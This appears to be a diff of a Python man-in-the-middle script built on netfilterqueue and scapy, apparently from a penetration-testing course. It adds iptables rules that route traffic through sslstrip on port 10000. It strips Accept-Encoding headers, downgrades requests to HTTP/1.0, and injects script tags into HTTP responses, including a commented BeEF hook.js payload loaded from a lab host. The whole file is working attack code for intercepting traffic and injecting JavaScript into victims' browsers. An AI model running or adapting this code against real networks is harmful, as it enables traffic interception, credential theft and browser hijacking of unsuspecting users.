@@ -7,6 +7,11 @@
 # iptables -I INPUT -j NFQUEUE --queue-num 0
 # iptables --flush
 
+# Targeting a remote computer, using sslstrip 
+# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+# iptables -I OUTPUT -j NFQUEUE --queue-num 0
+# iptables -I INPUT -j NFQUEUE --queue-num 0
+# iptables --flush
 
 import netfilterqueue
 import scapy.all as sc
@@ -26,13 +31,16 @@ def process_packet(packet):
     if scapy_packet.haslayer(sc.Raw):
         try:
             load = scapy_packet[sc.Raw].load.decode()
-            if scapy_packet[sc.TCP].dport == 80:
+            # if scapy_packet[sc.TCP].dport == 80:
+            if scapy_packet[sc.TCP].dport == 10000: # sslstrip
                 # print(f'[+] Request > {load}')
                 load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)
-            elif scapy_packet[sc.TCP].sport == 80:
+                load = load.replace('HTTP/1.1', 'HTTP/1.0')
+            # elif scapy_packet[sc.TCP].sport == 80:
+            elif scapy_packet[sc.TCP].sport == 10000: # sslstrip
                 # print(f'[+] Response > {load}')
-                # injection_code = '<script>alert("test");</script>'
-                injection_code = '<script src="http://10.0.2.13:3000/hook.js"></script>'
+                injection_code = '<script>alert("test");</script>'
+                # injection_code = '<script src="http://10.0.2.13:3000/hook.js"></script>' # BeEF
                 load = load.replace(
                     # '</body>', injection_code + '</body>')
                     '</head>', injection_code + '</head>')
